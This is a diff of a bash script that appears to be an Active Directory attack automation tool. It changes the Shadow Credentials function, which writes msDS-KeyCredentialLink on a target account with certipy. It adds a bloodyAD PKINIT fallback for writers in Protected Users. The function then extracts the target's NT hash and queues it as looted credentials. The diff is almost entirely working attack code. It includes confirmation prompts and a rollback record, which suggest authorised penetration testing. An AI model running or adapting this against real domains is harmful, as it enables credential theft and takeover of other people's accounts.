@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.28.2"
+readonly VERSION="1.29.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2712,29 +2712,57 @@ _abuse_user_smart() {
 # Returns 0 if it recovered a hash.
 _abuse_shadowcred() {
     local target="$1"
-    have certipy || return 1
+    { have certipy || have bloodyAD; } || return 1
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
     abuse_confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
-    # Prefer password/hash (certipy Kerberos is flaky); -target/-dc-host + ccache
-    # only as fallback. Mirrors phase_adcs so shadow works on NTLM-on labs too.
-    local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
-    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
-    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
-    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
-    run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
-    local out; out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
-    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
-       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
-        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
-        out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+    # If the writer is in Protected Users, NTLM is dead and certipy's Kerberos LDAP
+    # bind chokes (data 57) — skip certipy and go straight to bloodyAD (its Kerberos
+    # PKINIT flow works for these accounts).
+    local prot=0; [[ "${OWNED_GROUPS[${USER,,}]:-}" == *"Protected Users"* ]] && prot=1
+    local nt=""
+    if have certipy && [[ "$prot" == "0" ]]; then
+        # Prefer password/hash (certipy Kerberos is flaky); ccache only as fallback.
+        local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
+        if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS"); cenv=(env -u KRB5CCNAME)
+        elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH"); cenv=(env -u KRB5CCNAME)
+        elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
+        run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
+        local out; out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+        if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
+           && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
+            cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
+            out=$("${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+        fi
+        echo "$out" | tee -a "$LOGFILE"
+        nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
+    elif [[ "$prot" == "1" ]]; then
+        info "  ${USER} is in Protected Users → NTLM/certipy bind won't work; using bloodyAD (Kerberos PKINIT)"
     fi
-    echo "$out" | tee -a "$LOGFILE"
-    local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
         note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
         queue_cred "$target" "" "$nt" "Shadow Credentials"
         return 0
+    fi
+
+    # certipy's LDAP bind can fail (data 57; or the writer is in Protected Users so
+    # NTLM is dead and certipy's Kerberos chokes). bloodyAD does the SAME flow
+    # (write msDS-KeyCredentialLink → PKINIT → NT hash) over Kerberos and works
+    # where certipy doesn't — and Kerberos auth is proven to work for these accounts.
+    if have bloodyAD; then
+        local -a ba2; mapfile -t ba2 < <(bloody_args)
+        run "bloodyAD ${ba2[*]} add shadowCredentials '$target'"
+        local bo; bo=$( cd "$OUTDIR" && bloodyAD "${ba2[@]}" add shadowCredentials "$target" 2>&1 ); echo "$bo" | tee -a "$LOGFILE"
+        # NT hash from the PKINIT unpac, ignoring the empty-LM constant.
+        nt=$(grep -oiE '[0-9a-f]{32}' <<<"$bo" | grep -viE '^aad3b435b51404eeaad3b435b51404ee$' | tail -1)
+        if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
+            rb_record "Shadow Credentials (KeyCredentialLink) added on $target" \
+                      "bloodyAD ${ba2[*]} remove shadowCredentials '$target'"
+            loot "★ Shadow Credentials (bloodyAD/PKINIT) → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
+            note_cred_source "$target" "Shadow Credentials (bloodyAD PKINIT)"
+            queue_cred "$target" "" "$nt" "Shadow Credentials (bloodyAD)"
+            return 0
+        fi
     fi
     warn "Shadow Credentials did not yield a hash for $target"; return 1
 }
